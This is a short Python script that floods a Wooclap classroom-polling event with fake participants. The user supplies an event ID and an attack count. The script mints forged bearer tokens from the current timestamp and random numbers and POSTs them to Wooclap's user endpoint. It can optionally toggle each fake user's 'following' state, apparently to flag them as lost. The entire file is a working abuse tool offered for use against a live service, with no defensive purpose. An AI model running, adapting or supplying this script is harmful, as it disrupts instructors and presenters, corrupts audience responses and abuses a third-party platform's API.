import requests
import datetime
import math
import random

WOOCLAP_ID = ""
NUMBER_ATTACK = ""
LOST = ""

if WOOCLAP_ID == "":
    WOOCLAP_ID = input("WOOCLAP_ID ?\n> ")

if NUMBER_ATTACK == "":
    NUMBER_ATTACK = input("NUMBER_ATTACK ?\n> ")

if LOST == "":
    LOST = input("LOST ? YES or NO\n> ")

for i in range(0,int(NUMBER_ATTACK)):
    def generate_token():
        presentDate = datetime.datetime.now()
        unix_timestamp = datetime.datetime.timestamp(presentDate)*1000
        
        return f"z{math.floor(random.random() * random.random() * unix_timestamp)}"

    TOKEN = generate_token()
    BEARER = f"bearer {TOKEN}"

    requests.post(f"https://app.wooclap.com/api/user?slug={WOOCLAP_ID}", headers={ "authorization": BEARER }).json()
    
    if LOST.upper() == "YES":
        requests.post(f"https://app.wooclap.com/api/events/{WOOCLAP_ID}/toggle_is_following", headers={ "authorization": BEARER }).json()
    
    print(f"NEW USER PUSH: {TOKEN}\n")
